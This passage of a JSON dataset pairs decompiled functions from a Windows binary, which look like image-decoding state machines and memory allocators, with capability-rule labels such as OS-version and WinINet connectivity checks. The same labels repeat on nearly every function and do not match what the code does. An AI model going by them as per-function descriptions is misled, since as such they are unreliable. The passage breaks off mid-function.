        "decompiled_code": "\nint32_t fcn.004783b4(void)\n\n{\n    int32_t iVar1;\n    int32_t *in_EAX;\n    int32_t iVar2;\n    \n    iVar2 = 0;\n    // switch table (5 cases) at 0x4783df\n    switch(in_EAX[5]) {\n    case 200:\n        (**(in_EAX[0x6d] + 4))();\n        (**(in_EAX[6] + 8))();\n        in_EAX[5] = 0xc9;\n    case 0xc9:\n        iVar2 = (**in_EAX[0x6d])();\n        if (iVar2 == 1) {\n            fcn.00478160();\n            in_EAX[5] = 0xca;\n        }\n        break;\n    case 0xca:\n        iVar2 = 1;\n        break;\n    case 0xcb:\n    case 0xcc:\n    case 0xcd:\n    case 0xce:\n    case 0xcf:\n    case 0xd0:\n    case 0xd2:\n        iVar2 = (**in_EAX[0x6d])();\n        break;\n    default:\n        iVar1 = *in_EAX;\n        *(iVar1 + 0x14) = 0x14;\n        *(iVar1 + 0x18) = in_EAX[5];\n        (***in_EAX)();\n    }\n    return iVar2;\n}\n",
        "token_count": 314
    },
    "004784c8": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nuint fcn.004784c8(void)\n\n{\n    int32_t *in_EAX;\n    int32_t iVar1;\n    \n    if (((in_EAX[5] == 0xcd) || (in_EAX[5] == 0xce)) && (in_EAX[0x10] == 0)) {\n        if (in_EAX[0x23] < in_EAX[0x1d]) {\n            *(*in_EAX + 0x14) = 0x43;\n            (***in_EAX)();\n        }\n        (**(in_EAX[0x69] + 4))();\n        in_EAX[5] = 0xd2;\n    }\n    else if (in_EAX[5] == 0xcf) {\n        in_EAX[5] = 0xd2;\n    }\n    else if (in_EAX[5] != 0xd2) {\n        iVar1 = *in_EAX;\n        *(iVar1 + 0x14) = 0x14;\n        *(iVar1 + 0x18) = in_EAX[5];\n        (***in_EAX)();\n    }\n    do {\n        if (*(in_EAX[0x6d] + 0x14) != 0) {\n            (**(in_EAX[6] + 0x18))();\n            fcn.00483840();\n            return 1;\n        }\n        iVar1 = (**in_EAX[0x6d])();\n    } while (iVar1 != 0);\n    return 0;\n}\n",
        "token_count": 337
    },
    "0047858c": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.0047858c(uint32_t param_1, int32_t param_2)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    uint *puVar3;\n    int32_t *in_EAX;\n    uint32_t uVar4;\n    uint *puVar5;\n    uint32_t uVar6;\n    \n    iVar1 = in_EAX[1];\n    if (0x3b9ac9f4 < param_1) {\n        fcn.00478578();\n    }\n    if ((param_1 & 7) != 0) {\n        param_1 = param_1 + (8 - (param_1 & 7));\n    }\n    if ((param_2 < 0) || (1 < param_2)) {\n        iVar2 = *in_EAX;\n        *(iVar2 + 0x14) = 0xe;\n        *(iVar2 + 0x18) = param_2;\n        (***in_EAX)();\n    }\n    puVar3 = NULL;\n    for (puVar5 = *(iVar1 + 0x34 + param_2 * 4); (puVar5 != NULL && (puVar5[2] <= param_1 && param_1 != puVar5[2]));\n        puVar5 = *puVar5) {\n        puVar3 = puVar5;\n    }\n    if (puVar5 == NULL) {\n        if (puVar3 == NULL) {\n            uVar6 = *(param_2 * 4 + 0x491f80);\n        }\n        else {\n            uVar6 = *(param_2 * 4 + 0x491f88);\n        }\n        uVar4 = 1000000000 - (param_1 + 0xc);\n        if (uVar4 < uVar6) {\n            uVar6 = uVar4;\n        }\n        while (puVar5 = fcn.00479198(),  puVar5 == NULL) {\n            uVar6 = uVar6 / 2;\n            if (uVar6 < 0x32) {\n                fcn.00478578();\n            }\n        }\n        *(iVar1 + 0x4c) = param_1 + 0xc + uVar6 + *(iVar1 + 0x4c);\n        *puVar5 = 0;\n        puVar5[1] = 0;\n        puVar5[2] = uVar6 + param_1;\n        if (puVar3 == NULL) {\n            *(iVar1 + 0x34 + param_2 * 4) = puVar5;\n        }\n        else {\n            *puVar3 = puVar5;\n        }\n    }\n    iVar1 = puVar5[1];\n    puVar5[1] = puVar5[1] + param_1;\n    puVar5[2] = puVar5[2] - param_1;\n    return puVar5 + iVar1 + 0xc;\n}\n",
        "token_count": 657
    },
    "004786bc": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nulong __fastcall fcn.004786bc(uint32_t param_1, int32_t param_2)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t *in_EAX;\n    uint *puVar3;\n    \n    iVar1 = in_EAX[1];\n    if (0x3b9ac9f4 < param_1) {\n        fcn.00478578();\n    }\n    if ((param_1 & 7) != 0) {\n        param_1 = param_1 + (8 - (param_1 & 7));\n    }\n    if ((param_2 < 0) || (1 < param_2)) {\n        iVar2 = *in_EAX;\n        *(iVar2 + 0x14) = 0xe;\n        *(iVar2 + 0x18) = param_2;\n        (***in_EAX)();\n    }\n    puVar3 = fcn.004791a8();\n    if (puVar3 == NULL) {\n        fcn.00478578();\n    }\n    *(iVar1 + 0x4c) = *(iVar1 + 0x4c) + param_1 + 0xc;\n    *puVar3 = *(iVar1 + 0x3c + param_2 * 4);\n    puVar3[1] = param_1;\n    puVar3[2] = 0;\n    *(iVar1 + 0x3c + param_2 * 4) = puVar3;\n    return CONCAT44(param_2, puVar3 + 3);\n}\n",
        "token_count": 347
    },
    "00478914": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00478914(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t *in_EAX;\n    uint *puVar3;\n    uint in_ECX;\n    int32_t in_EDX;\n    uint var_4h;\n    \n    iVar1 = in_EAX[1];\n    if (in_EDX != 1) {\n        iVar2 = *in_EAX;\n        *(iVar2 + 0x14) = 0xe;\n        *(iVar2 + 0x18) = in_EDX;\n        (***in_EAX)();\n    }\n    puVar3 = fcn.0047858c();\n    *puVar3 = 0;\n    puVar3[1] = arg_ch;\n    puVar3[2] = arg_10h;\n    puVar3[3] = arg_8h;\n    puVar3[8] = in_ECX;\n    puVar3[10] = 0;\n    puVar3[0xb] = *(iVar1 + 0x44);\n    *(iVar1 + 0x44) = puVar3;\n    return;\n}\n",
        "token_count": 267
    },
    "0047897c": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0047897c(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t *in_EAX;\n    uint *puVar3;\n    uint in_ECX;\n    int32_t in_EDX;\n    uint var_4h;\n    \n    iVar1 = in_EAX[1];\n    if (in_EDX != 1) {\n        iVar2 = *in_EAX;\n        *(iVar2 + 0x14) = 0xe;\n        *(iVar2 + 0x18) = in_EDX;\n        (***in_EAX)();\n    }\n    puVar3 = fcn.0047858c();\n    *puVar3 = 0;\n    puVar3[1] = arg_ch;\n    puVar3[2] = arg_10h;\n    puVar3[3] = arg_8h;\n    puVar3[8] = in_ECX;\n    puVar3[10] = 0;\n    puVar3[0xb] = *(iVar1 + 0x48);\n    *(iVar1 + 0x48) = puVar3;\n    return;\n}\n",
        "token_count": 268
    },
    "00478b78": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00478b78(int32_t param_1, int32_t param_2)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    int32_t iStack16;\n    \n    iVar1 = *(param_2 + 8);\n    iStack16 = *(param_2 + 0x18) * iVar1;\n    iVar4 = 0;\n    while( true ) {\n        if (*(param_2 + 0x10) <= iVar4) {\n            return;\n        }\n        if (*(param_2 + 0x14) < *(param_2 + 0x10) - iVar4) {\n            iVar2 = *(param_2 + 0x14);\n        }\n        else {\n            iVar2 = *(param_2 + 0x10) - iVar4;\n        }\n        iVar3 = *(param_2 + 0x18) + iVar4;\n        if (*(param_2 + 0x1c) - iVar3 <= iVar2) {\n            iVar2 = *(param_2 + 0x1c) - iVar3;\n        }\n        if (*(param_2 + 4) - iVar3 <= iVar2) {\n            iVar2 = *(param_2 + 4) - iVar3;\n        }\n        if (iVar2 < 1) break;\n        iVar2 = iVar2 * iVar1;\n        if (param_1 == 0) {\n            (**(param_2 + 0x30))(iVar2, iStack16);\n        }\n        else {\n            (**(param_2 + 0x34))(iVar2, iStack16);\n        }\n        iStack16 = iStack16 + iVar2;\n        iVar4 = iVar4 + *(param_2 + 0x14);\n    }\n    return;\n}\n",
        "token_count": 404
    },
    "00478c24": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00478c24(int32_t param_1, int32_t param_2)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    int32_t iStack16;\n    \n    iVar1 = *(param_2 + 8) * 0x80;\n    iStack16 = *(param_2 + 0x18) * iVar1;\n    iVar4 = 0;\n    while( true ) {\n        if (*(param_2 + 0x10) <= iVar4) {\n            return;\n        }\n        if (*(param_2 + 0x14) < *(param_2 + 0x10) - iVar4) {\n            iVar2 = *(param_2 + 0x14);\n        }\n        else {\n            iVar2 = *(param_2 + 0x10) - iVar4;\n        }\n        iVar3 = *(param_2 + 0x18) + iVar4;\n        if (*(param_2 + 0x1c) - iVar3 <= iVar2) {\n            iVar2 = *(param_2 + 0x1c) - iVar3;\n        }\n        if (*(param_2 + 4) - iVar3 <= iVar2) {\n            iVar2 = *(param_2 + 4) - iVar3;\n        }\n        if (iVar2 < 1) break;\n        iVar2 = iVar2 * iVar1;\n        if (param_1 == 0) {\n            (**(param_2 + 0x30))(iVar2, iStack16);\n        }\n        else {\n            (**(param_2 + 0x34))(iVar2, iStack16);\n        }\n        iStack16 = iStack16 + iVar2;\n        iVar4 = iVar4 + *(param_2 + 0x14);\n    }\n    return;\n}\n",
        "token_count": 410
    },
    "00478cd4": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.00478cd4(int32_t arg_8h, uint32_t arg_ch)\n\n{\n    int32_t *in_EAX;\n    int32_t iVar1;\n    uint32_t in_ECX;\n    int32_t *in_EDX;\n    uint32_t uVar2;\n    uint32_t uVar3;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    uVar3 = in_ECX + arg_ch;\n    if (((in_EDX[1] <= uVar3 && uVar3 != in_EDX[1]) || (in_EDX[3] <= arg_ch && arg_ch != in_EDX[3])) || (*in_EDX == 0))\n    {\n        *(*in_EAX + 0x14) = 0x16;\n        (***in_EAX)();\n    }\n    if ((in_ECX < in_EDX[6]) || (in_EDX[6] + in_EDX[4] < uVar3)) {\n        if (in_EDX[10] == 0) {\n            *(*in_EAX + 0x14) = 0x45;\n            (***in_EAX)();\n        }\n        if (in_EDX[9] != 0) {\n            fcn.00478b78();\n            in_EDX[9] = 0;\n        }\n        if (in_ECX < in_EDX[6] || in_ECX == in_EDX[6]) {\n            iVar1 = uVar3 - in_EDX[4];\n            if (iVar1 < 0) {\n                iVar1 = 0;\n            }\n            in_EDX[6] = iVar1;\n        }\n        else {\n            in_EDX[6] = in_ECX;\n        }\n        fcn.00478b78();\n    }\n    if (in_EDX[7] < uVar3) {\n        if (in_EDX[7] < in_ECX) {\n            uVar2 = in_ECX;\n            if (arg_8h != 0) {\n                *(*in_EAX + 0x14) = 0x16;\n                (***in_EAX)();\n            }\n        }\n        else {\n            uVar2 = in_EDX[7];\n        }\n        if (arg_8h != 0) {\n            in_EDX[7] = uVar3;\n        }\n        if (in_EDX[8] == 0) {\n            if (arg_8h == 0) {\n                *(*in_EAX + 0x14) = 0x16;\n                (***in_EAX)();\n            }\n        }\n        else {\n            iVar1 = in_EDX[6];\n            for (uVar2 = uVar2 - iVar1; uVar2 < uVar3 - iVar1; uVar2 = uVar2 + 1) {\n                fcn.00483830();\n            }\n        }\n    }\n    if (arg_8h != 0) {\n        in_EDX[9] = 1;\n    }\n    return (in_ECX - in_EDX[6]) * 4 + *in_EDX;\n}\n",
        "token_count": 687
    },
    "00478e18": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.00478e18(int32_t arg_8h, uint32_t arg_ch)\n\n{\n    int32_t *in_EAX;\n    int32_t iVar1;\n    uint32_t in_ECX;\n    int32_t *in_EDX;\n    uint32_t uVar2;\n    uint32_t uVar3;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    uVar3 = in_ECX + arg_ch;\n    if (((in_EDX[1] <= uVar3 && uVar3 != in_EDX[1]) || (in_EDX[3] <= arg_ch && arg_ch != in_EDX[3])) || (*in_EDX == 0))\n    {\n        *(*in_EAX + 0x14) = 0x16;\n        (***in_EAX)();\n    }\n    if ((in_ECX < in_EDX[6]) || (in_EDX[6] + in_EDX[4] < uVar3)) {\n        if (in_EDX[10] == 0) {\n            *(*in_EAX + 0x14) = 0x45;\n            (***in_EAX)();\n        }\n        if (in_EDX[9] != 0) {\n            fcn.00478c24();\n            in_EDX[9] = 0;\n        }\n        if (in_ECX < in_EDX[6] || in_ECX == in_EDX[6]) {\n            iVar1 = uVar3 - in_EDX[4];\n            if (iVar1 < 0) {\n                iVar1 = 0;\n            }\n            in_EDX[6] = iVar1;\n        }\n        else {\n            in_EDX[6] = in_ECX;\n        }\n        fcn.00478c24();\n    }\n    if (in_EDX[7] < uVar3) {\n        if (in_EDX[7] < in_ECX) {\n            uVar2 = in_ECX;\n            if (arg_8h != 0) {\n                *(*in_EAX + 0x14) = 0x16;\n                (***in_EAX)();\n            }\n        }\n        else {\n            uVar2 = in_EDX[7];\n        }\n        if (arg_8h != 0) {\n            in_EDX[7] = uVar3;\n        }\n        if (in_EDX[8] == 0) {\n            if (arg_8h == 0) {\n                *(*in_EAX + 0x14) = 0x16;\n                (***in_EAX)();\n            }\n        }\n        else {\n            iVar1 = in_EDX[6];\n            for (uVar2 = uVar2 - iVar1; uVar2 < uVar3 - iVar1; uVar2 = uVar2 + 1) {\n                fcn.00483830();\n            }\n        }\n    }\n    if (arg_8h != 0) {\n        in_EDX[9] = 1;\n    }\n    return (in_ECX - in_EDX[6]) * 4 + *in_EDX;\n}\n",
        "token_count": 687
    },
    "004797ec": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.004797ec(uint param_1, uint param_2)\n\n{\n    uint *puVar1;\n    int32_t in_EAX;\n    int32_t iVar2;\n    uint uVar3;\n    \n    if (*(in_EAX + 0x18) == 0) {\n        iVar2 = (***(in_EAX + 4))();\n        *(in_EAX + 0x18) = iVar2;\n        uVar3 = (***(in_EAX + 4))();\n        *(iVar2 + 0x20) = uVar3;\n    }\n    puVar1 = *(in_EAX + 0x18);\n    puVar1[2] = 0x479740;\n    puVar1[3] = fcn.0047974c;\n    puVar1[4] = 0x4797bc;\n    puVar1[5] = 0x48351c;\n    puVar1[6] = 0x4797e8;\n    puVar1[7] = param_2;\n    puVar1[1] = 0;\n    *puVar1 = 0;\n    return;\n}\n",
        "token_count": 255
    },
    "00479858": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nuint fcn.00479858(void)\n\n{\n    int32_t *piVar1;\n    int32_t *in_EAX;\n    int32_t iVar2;\n    uint uVar3;\n    \n    if (in_EAX[5] == 0xca) {\n        fcn.0047a30c();\n        if (in_EAX[0x10] != 0) {\n            in_EAX[5] = 0xcf;\n            return 1;\n        }\n        in_EAX[5] = 0xcb;\n    }\n    if (in_EAX[5] == 0xcb) {\n        if (*(in_EAX[0x6d] + 0x10) != 0) {\n            while( true ) {\n                if (in_EAX[2] != 0) {\n                    (**in_EAX[2])();\n                }\n                iVar2 = (**in_EAX[0x6d])();\n                if (iVar2 == 0) {\n                    return 0;\n                }\n                if (iVar2 == 2) break;\n                if ((in_EAX[2] != 0) && ((iVar2 == 3 || (iVar2 == 1)))) {\n                    iVar2 = in_EAX[2];\n                    piVar1 = iVar2 + 4;\n                    *piVar1 = *piVar1 + 1;\n                    if (*(in_EAX[2] + 8) <= *(iVar2 + 4)) {\n                        piVar1 = in_EAX[2] + 8;\n                        *piVar1 = *piVar1 + in_EAX[0x50];\n                    }\n                }\n            }\n        }\n        in_EAX[0x26] = in_EAX[0x24];\n    }\n    else if (in_EAX[5] != 0xcc) {\n        iVar2 = *in_EAX;\n        *(iVar2 + 0x14) = 0x14;\n        *(iVar2 + 0x18) = in_EAX[5];\n        (***in_EAX)();\n    }\n    uVar3 = fcn.00479920();\n    return uVar3;\n}\n",
        "token_count": 463
    },
    "00479920": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nuint fcn.00479920(void)\n\n{\n    int32_t iVar1;\n    int32_t in_EAX;\n    uint uVar2;\n    \n    if (*(in_EAX + 0x14) != 0xcc) {\n        (***(in_EAX + 0x1a4))();\n        *(in_EAX + 0x8c) = 0;\n        *(in_EAX + 0x14) = 0xcc;\n    }\n    do {\n        if (*(*(in_EAX + 0x1a4) + 8) == 0) {\n            if (*(in_EAX + 0x44) == 0) {\n                uVar2 = 0xcd;\n            }\n            else {\n                uVar2 = 0xce;\n            }\n            *(in_EAX + 0x14) = uVar2;\n            return 1;\n        }\n        while (*(in_EAX + 0x8c) < *(in_EAX + 0x74)) {\n            iVar1 = *(in_EAX + 8);\n            if (iVar1 != 0) {\n                *(iVar1 + 4) = *(in_EAX + 0x8c);\n                *(iVar1 + 8) = *(in_EAX + 0x74);\n                (***(in_EAX + 8))();\n            }\n            iVar1 = *(in_EAX + 0x8c);\n            (**(*(in_EAX + 0x1a8) + 4))(0);\n            if (iVar1 == *(in_EAX + 0x8c)) {\n                return 0;\n            }\n        }\n        (**(*(in_EAX + 0x1a4) + 4))();\n        (***(in_EAX + 0x1a4))();\n        *(in_EAX + 0x8c) = 0;\n    } while( true );\n}\n",
        "token_count": 410
    },
    "00479b1c": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00479b1c(uint param_1, int32_t param_2)\n\n{\n    int32_t iVar1;\n    int32_t *in_EAX;\n    \n    if ((in_EAX[5] != 0xcf) && (in_EAX[5] != 0xcc)) {\n        iVar1 = *in_EAX;\n        *(iVar1 + 0x14) = 0x14;\n        *(iVar1 + 0x18) = in_EAX[5];\n        (***in_EAX)();\n    }\n    if (param_2 < 1) {\n        param_2 = 1;\n    }\n    if ((*(in_EAX[0x6d] + 0x14) != 0) && (in_EAX[0x24] < param_2)) {\n        param_2 = in_EAX[0x24];\n    }\n    in_EAX[0x26] = param_2;\n    fcn.00479920();\n    return;\n}\n",
        "token_count": 222
    },
    "00479b7c": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nuint fcn.00479b7c(void)\n\n{\n    int32_t *in_EAX;\n    int32_t iVar1;\n    \n    if (((in_EAX[5] == 0xcd) || (in_EAX[5] == 0xce)) && (in_EAX[0x10] != 0)) {\n        (**(in_EAX[0x69] + 4))();\n        in_EAX[5] = 0xd0;\n    }\n    else if (in_EAX[5] != 0xd0) {\n        iVar1 = *in_EAX;\n        *(iVar1 + 0x14) = 0x14;\n        *(iVar1 + 0x18) = in_EAX[5];\n        (***in_EAX)();\n    }\n    while ((in_EAX[0x24] <= in_EAX[0x26] && (*(in_EAX[0x6d] + 0x14) == 0))) {\n        iVar1 = (**in_EAX[0x6d])();\n        if (iVar1 == 0) {\n            return 0;\n        }\n    }\n    in_EAX[5] = 0xcf;\n    return 1;\n}\n",
        "token_count": 265
    },
    "00479c04": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nuint fcn.00479c04(void)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t in_EAX;\n    \n    if ((*(in_EAX + 0x4c) != 0) || (*(in_EAX + 300) != 0)) {\n        return 0;\n    }\n    if ((*(in_EAX + 0x28) == 3) && (((*(in_EAX + 0x24) == 3 && (*(in_EAX + 0x2c) == 2)) && (*(in_EAX + 0x78) == 3)))) {\n        iVar1 = *(in_EAX + 0xd8);\n        if (((((*(iVar1 + 8) == 2) && (*(iVar1 + 0x5c) == 1)) && (*(iVar1 + 0xb0) == 1)) &&\n            ((*(iVar1 + 0xc) < 3 && (*(iVar1 + 0x60) == 1)))) && (*(iVar1 + 0xb4) == 1)) {\n            iVar1 = *(in_EAX + 0xd8);\n            iVar2 = *(in_EAX + 0x13c);\n            if (((*(iVar1 + 0x24) == iVar2) && (iVar2 == *(iVar1 + 0x78))) && (iVar2 == *(iVar1 + 0xcc))) {\n                return 1;\n            }\n            return 0;\n        }\n        return 0;\n    }\n    return 0;\n}\n",
        "token_count": 339
    },
    "00479c94": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid fcn.00479c94(void)\n\n{\n    int32_t *in_EAX;\n    int32_t iVar1;\n    int32_t iVar2;\n    uint uVar3;\n    int32_t iVar4;\n    \n    if (in_EAX[5] != 0xca) {\n        iVar1 = *in_EAX;\n        *(iVar1 + 0x14) = 0x14;\n        *(iVar1 + 0x18) = in_EAX[5];\n        (***in_EAX)();\n    }\n    if (in_EAX[0xc] << 3 < in_EAX[0xd] || in_EAX[0xc] << 3 == in_EAX[0xd]) {\n        iVar1 = fcn.004837ac();\n        in_EAX[0x1c] = iVar1;\n        iVar1 = fcn.004837ac();\n        in_EAX[0x1d] = iVar1;\n        in_EAX[0x4f] = 1;\n    }\n    else if (in_EAX[0xc] << 2 < in_EAX[0xd] || in_EAX[0xc] << 2 == in_EAX[0xd]) {\n        iVar1 = fcn.004837ac();\n        in_EAX[0x1c] = iVar1;\n        iVar1 = fcn.004837ac();\n        in_EAX[0x1d] = iVar1;\n        in_EAX[0x4f] = 2;\n    }\n    else if (in_EAX[0xc] * 2 < in_EAX[0xd] || in_EAX[0xc] * 2 == in_EAX[0xd]) {\n        iVar1 = fcn.004837ac();\n        in_EAX[0x1c] = iVar1;\n        iVar1 = fcn.004837ac();\n        in_EAX[0x1d] = iVar1;\n        in_EAX[0x4f] = 4;\n    }\n    else {\n        in_EAX[0x1c] = in_EAX[7];\n        in_EAX[0x1d] = in_EAX[8];\n        in_EAX[0x4f] = 8;\n    }\n    iVar1 = in_EAX[0x36];\n    for (iVar4 = 0; iVar4 < in_EAX[9]; iVar4 = iVar4 + 1) {\n        for (iVar2 = in_EAX[0x4f];\n            ((iVar2 < 8 && (*(iVar1 + 8) * iVar2 * 2 <= in_EAX[0x4d] * in_EAX[0x4f])) &&\n            (*(iVar1 + 0xc) * iVar2 * 2 <= in_EAX[0x4e] * in_EAX[0x4f])); iVar2 = iVar2 * 2) {\n        }\n        *(iVar1 + 0x24) = iVar2;\n        iVar1 = iVar1 + 0x54;\n    }\n    iVar1 = in_EAX[0x36];\n    for (iVar4 = 0; iVar4 < in_EAX[9]; iVar4 = iVar4 + 1) {\n        uVar3 = fcn.004837ac();\n        *(iVar1 + 0x28) = uVar3;\n        uVar3 = fcn.004837ac();\n        *(iVar1 + 0x2c) = uVar3;\n        iVar1 = iVar1 + 0x54;\n    }\n    iVar1 = in_EAX[0xb];\n    if (iVar1 == 1) {\n        in_EAX[0x1e] = 1;\n    }\n    else if (iVar1 - 2U < 2) {\n        in_EAX[0x1e] = 3;\n    }\n    else if (iVar1 - 4U < 2) {\n        in_EAX[0x1e] = 4;\n    }\n    else {\n        in_EAX[0x1e] = in_EAX[9];\n    }\n    if (in_EAX[0x15] == 0) {\n        iVar1 = in_EAX[0x1e];\n    }\n    else {\n        iVar1 = 1;\n    }\n    in_EAX[0x1f] = iVar1;\n    iVar1 = fcn.00479c04();\n    if (iVar1 == 0) {\n        in_EAX[0x20] = 1;\n    }\n    else {\n        in_EAX[0x20] = in_EAX[0x4e];\n    }\n    return;\n}\n",
        "token_count": 1015
    },
    "00479f1c": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x00479f40)\n\nvoid fcn.00479f1c(void)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t *in_EAX;\n    uint uVar3;\n    int32_t iVar4;\n    \n    iVar1 = in_EAX[0x69];\n    fcn.00479c94();\n    fcn.00479e80();\n    *(iVar1 + 0xc) = 0;\n    uVar3 = fcn.00479c04();\n    *(iVar1 + 0x10) = uVar3;\n    *(iVar1 + 0x14) = 0;\n    *(iVar1 + 0x18) = 0;\n    if ((in_EAX[0x15] == 0) || (in_EAX[0x10] == 0)) {\n        in_EAX[0x19] = 0;\n        in_EAX[0x1a] = 0;\n        in_EAX[0x1b] = 0;\n    }\n    if (in_EAX[0x15] != 0) {\n        if (in_EAX[0x11] != 0) {\n            *(*in_EAX + 0x14) = 0x2f;\n            (***in_EAX)();\n        }\n        if (in_EAX[0x1e] == 3) {\n            if (in_EAX[0x22] == 0) {\n                if (in_EAX[0x17] == 0) {\n                    in_EAX[0x19] = 1;\n                }\n                else {\n                    in_EAX[0x1b] = 1;\n                }\n            }\n            else {\n                in_EAX[0x1a] = 1;\n            }\n        }\n        else {\n            in_EAX[0x19] = 1;\n            in_EAX[0x1a] = 0;\n            in_EAX[0x1b] = 0;\n            in_EAX[0x22] = 0;\n        }\n        if (in_EAX[0x19] != 0) {\n            fcn.0047d340();\n            *(iVar1 + 0x14) = in_EAX[0x73];\n        }\n        if ((in_EAX[0x1b] != 0) || (in_EAX[0x1a] != 0)) {\n            fcn.0047e5b4();\n            *(iVar1 + 0x18) = in_EAX[0x73];\n        }\n    }\n    if (in_EAX[0x11] == 0) {\n        if (*(iVar1 + 0x10) == 0) {\n            fcn.0047c5c0();\n            fcn.004808e4();\n        }\n        else {\n            fcn.0047c164();\n        }\n        fcn.0048009c();\n    }\n    fcn.00480384();\n    if (in_EAX[0x38] == 0) {\n        if (in_EAX[0x37] == 0) {\n            fcn.0047bbb8();\n        }\n        else {\n            fcn.0047aff8();\n        }\n    }\n    else {\n        *(*in_EAX + 0x14) = 1;\n        (***in_EAX)();\n    }\n    fcn.0047fd28();\n    if (in_EAX[0x11] == 0) {\n        fcn.0047eccc();\n    }\n    (**(in_EAX[1] + 0x18))();\n    (**(in_EAX[0x6d] 